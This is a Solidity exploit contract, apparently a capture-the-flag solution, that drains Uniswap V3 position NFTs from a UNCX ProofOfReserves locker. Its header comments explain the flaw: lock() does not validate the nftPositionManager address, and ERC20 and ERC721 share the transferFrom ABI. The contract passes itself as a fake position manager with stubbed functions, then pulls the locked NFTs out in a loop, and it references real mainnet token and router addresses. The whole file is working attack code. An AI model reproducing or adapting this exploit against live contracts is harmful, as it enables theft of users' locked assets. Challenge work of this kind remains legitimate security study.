import "forge-std/test.sol";
import "forge-std/console.sol";
import "../src/Challenge.sol";
import "../src/UNCX_ProofOfReservesV2_UniV3.sol";

/**
 * @title summary: drain Uniswap NFTs on UNCX contract
 *               1、for UNCX contract: LockParams (struct) => lock() => withdraw()
 * @author       1) check function: approve, transfer, transferFrom
 *                    - In the case of ERC20 and ERC721, the three functions can be called with the same ABI
 *                    - so if user input was allowed, we could create a situation where ERC721 tokens were transferred when ERC20 tokens were supposed to be sent.
 *               2) Lock(): no check nftPositionManager
 *                    - LockParams:
 *                         - replacing nftPositionManager with attack contract
 *                    - TARGET.lock() does not validate the address nftPositionManager
 *               2、what's
 *
 * @notice
 */

contract Exploit {
    Challenge c = Challenge(0x0147383f0CA823cCc5F5609302b0fAEFFa48A5E8);
    IUNCX_ProofOfReservesV2_UniV3 v =
        IUNCX_ProofOfReservesV2_UniV3(
            0x7f5C649856F900d15C83741f45AE46f5C6858234
        );
    INonfungiblePositionManager u =
        INonfungiblePositionManager(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IWETH weth = IWETH(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 usdt = IERC20(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IUniswapV2Router02 r =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);

    uint256 ctid;

    function exploit(uint256 m) public {
        for (uint256 i = 0; i < m; i++) {
            // assigns the token ID owned by the address v at index 0 to the variable ctid.
            // https://etherscan.io/address/0xC36442b4a4522E871399CD717aBDD847Ab11FE88#readContract#F14
            ctid = u.tokenOfOwnerByIndex(address(v), 0);
            console.log(ctid);

            // empty dynamic array of bytes named r with a length of 0
            bytes[] memory r = new bytes[](0);

            LockParams memory lock = LockParams({
                nftPositionManager: INonfungiblePositionManager(address(this)),
                // ??? why 24
                nft_id: 24,
                dustRecipient: address(this),
                owner: address(this),
                additionalCollector: address(this),
                collectAddress: address(this),
                unlockDate: block.timestamp + 1,
                countryCode: 0,
                feeName: "DEFAULT",
                r: r
            });
            v.lock(lock);
            // transfer the token with ID ctid from the address v to the current contract.
            u.transferFrom(address(v), address(this), ctid);
        }

        console.log("balanceOf", u.balanceOf(address(v)));
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public {}

    function positions(
        uint256 tokenId
    )
        external
        view
        returns (
            uint96 nonce,
            address operator,
            address token0,
            address token1,
            uint24 fee,
            int24 tickLower,
            int24 tickUpper,
            uint128 liquidity,
            uint256 feeGrowthInside0LastX128,
            uint256 feeGrowthInside1LastX128,
            uint128 tokensOwed0,
            uint128 tokensOwed1
        )
    {
        nonce = 0;
        operator = address(this);
        token0 = address(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
        token1 = address(this);
        fee = 0;
        tickLower = 0;
        tickUpper = 0;
        liquidity = 0;
        feeGrowthInside0LastX128 = 0;
        feeGrowthInside1LastX128 = 0;
        tokensOwed0 = 0;
        tokensOwed1 = 0;
    }

    function factory() external view returns (address) {
        return address(this);
    }

    function getPool(
        address tokenA,
        address tokenB,
        uint24 fee
    ) external view returns (address) {
        return address(this);
    }

    function feeAmountTickSpacing(uint24 fee) external view returns (int24) {
        return 1;
    }

    function decreaseLiquidity(
        INonfungiblePositionManager.DecreaseLiquidityParams calldata params
    ) external payable returns (uint256 amount0, uint256 amount1) {
        return (0, 0);
    }

    function collect(
        INonfungiblePositionManager.CollectParams calldata params
    ) external payable returns (uint256 amount0, uint256 amount1) {
        return (ctid, 0);
    }

    function balanceOf(address owner) external view returns (uint256) {
        return 0;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        return true;
    }

    function burn(uint256 tokenId) external payable {}

    function mint(
        INonfungiblePositionManager.MintParams calldata params
    )
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        )
    {
        return (0, 0, ctid, 0);
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public pure returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
